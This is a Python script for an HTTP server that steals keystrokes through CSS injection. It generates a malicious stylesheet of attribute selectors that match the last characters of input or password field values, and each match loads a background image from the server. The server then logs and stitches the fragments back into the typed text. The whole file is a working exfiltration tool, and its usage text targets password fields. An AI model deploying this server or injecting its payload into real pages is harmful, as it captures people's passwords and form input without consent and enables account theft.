#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from itertools import product
import argparse, logging, math, urllib.parse, re, os, json

description = '''Start server to receive key strokes inside password input fields:
\tpython3 server.py freq_en.json -e input -a value -t password
Start server to receive key strokes inside any input field:
\tpython3 server.py freq_en.json -e input -a value'''

# Initialize argument parsing
class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter): pass
parser = argparse.ArgumentParser(
    epilog=description,
    formatter_class=CustomFormatter,
    description="Exfiltration server to steal keystrokes using pure CSS")

scan_group = parser.add_argument_group('PARAMETERS')
parser.add_argument("input", type = str, default="freq_en.json", help="Input JSON file that contains histogram of frequent character combinations (can be generated using frequency_analyzer.py)")
parser.add_argument("-e", "--element", type = str, default="input", help="Element, class or id to exfiltrate (e.g. input, .class, #id)")
parser.add_argument("-a", "--attribute", type = str, default="value", help="Attribute name to log (e.g. value)")
parser.add_argument("-t", "--type", type = str, help="Type of the element (e.g. text, password)")
parser.add_argument("-n", "--num-selectors", type = int, default=5000, help="Maximum number of selectors to generate")
parser.add_argument("-v", "--verbose",  action='store_true', help="Increase output verbosity")

general_group = parser.add_argument_group("NETWORK")
parser.add_argument("-p", "--port", type = int, default=8000, help="Port to listen on")
parser.add_argument("-l", "--listen", type = str, default="127.0.0.1", help="IP to listen on")

args = parser.parse_args()

params = {
    "attribute": args.attribute,
    "element": args.element,
    "e_type": args.type,
    "ip": args.listen,
    "port": args.port
}

# Assert that input file exists
assert os.path.isfile(args.input), f"File {args.input} does not exist"

# Initialize logging
logger = logging.getLogger(__name__)
logger.setLevel(args.verbose and logging.DEBUG or logging.INFO)
formatter = logging.Formatter('%(levelname)s: [SERVER] %(message)s')
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)

def generate_keys(file_name: str) -> list:
    # Defined in https://www.w3.org/TR/CSS21/syndata.html#characters
    # Read JSON file
    json_obj = None
    with open(file_name, "r") as f:
        json_obj = json.load(f)
    assert json_obj, f"Failed to read JSON file {file_name}"

    '''
    {
        "1": {
            "1": 661586,
            "2": 462186,
            "3": 276015,
        },
        "2": {...},
        "3": {...},
    }
    '''
    combinations = [int(k) for k in json_obj.keys()]
    combinations.sort()
    assert 1 in combinations, "Size '1' must be present in the JSON file"

    # Convert every combination to a list of characters sorted by frequency (descending)
    for k in combinations:
        # Sort by frequency (descending)
        json_obj[str(k)] = sorted(json_obj[str(k)].items(), key=lambda x: x[1], reverse=True)
        # Convert to list of characters
        json_obj[str(k)] = [x[0] for x in json_obj[str(k)]]

    total_combinations = sum(len(json_obj[str(k)]) for k in combinations)
    if total_combinations < args.num_selectors:
        logger.warning(f"Total number of combinations ({total_combinations}) is less than the limit ({args.num_selectors}) of selectors. Consider increasing the amount of characters to analyze")

    keys = []
    # top_most is a multiplier for the amount of characters to add
    # 100 % of 1-character combinations, 50 % of 2-character combinations, 25 % of 3-character combinations, etc.
    top_most, s_limit = 1, args.num_selectors

    # Edgecase: More characters than selectors
    if len(json_obj["1"]) > s_limit:
        # Only add 1-character combinations
        if s_limit >= 8000:
            logger.warning(f"Number of 1-character combinations ({len(json_obj['1'])}) exceeds the limit ({s_limit}). Consider reducing the amount of characters to analyze")
        return json_obj["1"][:s_limit]

    # Add all combinations until the limit is reached
    for k in combinations:
        remaining = s_limit - len(keys)
        if remaining <= 0:
            break
        amount = min(remaining, math.ceil(len(json_obj[str(k)]) * top_most))
        logger.debug(f"Adding {amount} {k}-character combinations")
        keys.extend(json_obj[str(k)][:amount])
        top_most *= 0.5

    return keys

# Global variable to store keystrokes
keystrokes = ""

def merge_stroke(stroke):
    global keystrokes

    # abc + d -> abcd
    if len(stroke) == 1:
        logger.debug(f"{keystrokes} + {stroke} -> {keystrokes + stroke}")
        keystrokes += stroke
    # abc + bcd -> abcd
    # abc + def -> abcdef
    else:
        # Check how many characters are common
        common = 0
        for i in range(min(len(stroke), len(keystrokes)), 0, -1):
            if keystrokes.endswith(stroke[:i]):
                common = i
                break
        # Add the remaining characters
        logger.debug(f"{keystrokes} + {stroke} -> {keystrokes + stroke[common:]}")
        keystrokes += stroke[common:]

    print(f"Keystrokes: {keystrokes}")


def generate_payload(element: str = "input", attribute: str = "value", e_type: str = None, ip: str = "127.0.0.1", port: int = 8000) -> str:
    '''
    input[type="password"][value$="x"] {
        background-image: url("http://127.0.0.1:8000/?k=x");
    }
    '''
    # This is a mess
    type_selector = f"[type='{e_type}']" if e_type else ""
    url = f"http://{ip}:{port}/?k={{3}}"
    selector = f"{element}{type_selector}[{attribute}$='{{2}}']"
    selector += f"{{0}} background-image: url('{url}'); {{1}}\n"

    # Build payload
    payload = ""
    for k in generate_keys(args.input):
        # Split into list of characters and convert to hex unicode value
        k = [format(ord(c), 'x') for c in k]
        char_selector = "\\" + "\\".join(k)
        # comma-separated list of character codes
        char_url = ",".join(k)
        payload += selector.format("{", "}", char_selector, char_url)
    # Visualize that the payload had been received and read by the useragent
    payload += "body{background-color: red;}"

    return payload

class AttackerServer(BaseHTTPRequestHandler):
    def do_GET(self):
        # get client ip and url parameters
        client_ip = self.client_address[0]
        url_parameters = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        path = self.path

        self.handle_request(client_ip, url_parameters, path)

    def do_POST(self):
        # get client ip and post data
        client_ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        post_data = urllib.parse.parse_qs(self.rfile.read(content_length).decode('utf-8'))
        path = self.path

        self.handle_request(client_ip, post_data, path)

    def handle_request(self, client_ip:str, parameters:dict, path:str):
        response = ""
        self.send_response(200)

        # client sent key stroke
        if 'k' in parameters:
            logger.debug(f"Received key stroke from {client_ip}: {parameters['k'][0]}")
            keys = parameters['k'][0].split(',')
            # Convert to characters
            stroke = "".join([chr(int(k, 16)) for k in keys])
            merge_stroke(stroke)

            self.send_header('Content-type', 'image/svg+xml')
            self.send_header('Cache-Control', 'no-store, must-revalidate')
            self.send_header('Expires', '0')
            # response with empty svg (quite useless, but the requests won't get displayed as failed in the devtools)
            response = '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0"></svg>'
        # client requests malicious payload
        elif path == "/style.css":
            # Reset keystrokes
            global keystrokes
            keystrokes = ""

            logger.info(f"Start generating payload for {client_ip}")
            response = generate_payload(**params)
            logger.info(f"Payload for {client_ip} generated. Size: {len(response) / 1024:.2f} KB")
            self.send_header('Content-type', 'text/css')
        else:
            self.send_header('Content-type', 'text/plain')

        # respond to client
        self.end_headers()
        self.wfile.write(response.encode('utf-8'))

def run( ip: str, port: int, server_class=HTTPServer, handler_class=AttackerServer):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)
    logger.info('Starting http server...')
    httpd.serve_forever()

run(args.listen, args.port)
